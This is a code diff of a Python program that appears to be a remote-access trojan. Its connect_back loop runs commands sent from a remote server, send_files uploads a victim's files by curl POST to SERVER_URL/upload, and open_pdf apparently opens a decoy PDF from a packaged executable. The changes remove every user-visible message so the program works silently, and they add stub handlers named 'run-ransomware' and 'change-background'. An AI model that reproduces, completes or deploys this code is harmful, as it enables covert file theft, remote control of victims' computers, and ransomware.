@@ -46,7 +46,6 @@ def put_files_in_desktop(args):
     desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
     files_to_put = args[1:]
     if not files_to_put:
-        print("No files to put")
         return
     urls = []
     for arg in args:
@@ -124,7 +123,6 @@ def get_location_and_send():
 def send_files(args):
     files_to_send = args[1:]
     if not files_to_send:
-        print("No files provided to upload.")
         return
     valid_files = []
     for file_path in files_to_send:
@@ -132,23 +130,19 @@ def send_files(args):
             with open(file_path, "rb"):
                 valid_files.append(file_path)
         except FileNotFoundError:
-            print(f"File not found: {file_path}")
+            pass
         except Exception as e:
-            print(f"Cannot open {file_path}: {e}")
+            pass
     if not valid_files:
-        print("No valid files to send.")
         return
     curl_cmd = ["curl", "-X", "POST"]
     for file_path in valid_files:
         curl_cmd.extend(["-F", f"files=@{file_path}"])
     curl_cmd.append(f"{SERVER_URL}/upload")
     try:
-        result = subprocess.run(curl_cmd,shell=True, capture_output=True, text=True)
-        print("Server response:", result.stdout)
-        if result.stderr:
-            print("Errors:", result.stderr)
+        subprocess.run(curl_cmd,shell=True, capture_output=True, text=True)
     except Exception as e:
-        print(f"Failed to send files: {e}")
+        pass
 def send_all():
     try:
         files = [
@@ -174,14 +168,10 @@ def send_all():
             )
             if result.returncode == 0:
                 success = True
-            else:
-                print("Error:", result.stderr)
         return success
     except Exception as e:
-        print("error:", e)
         return False
 def open_pdf():
-    print("Open pdf in webborwser....")
     if hasattr(sys, "_MEIPASS"):
         base_path = sys._MEIPASS
     else:
@@ -271,6 +261,10 @@ def connect_back():
                 for folder in parts:
                     subprocess.run(["cmd", "/c", "mkdir", folder], shell=True)
                 continue
+            if cmd.lower() == "run-ransomware":
+                pass
+            if cmd.lower() == "change-background":
+                pass
             if cmd.lower() == "exit":
                 break
             output = subprocess.run(
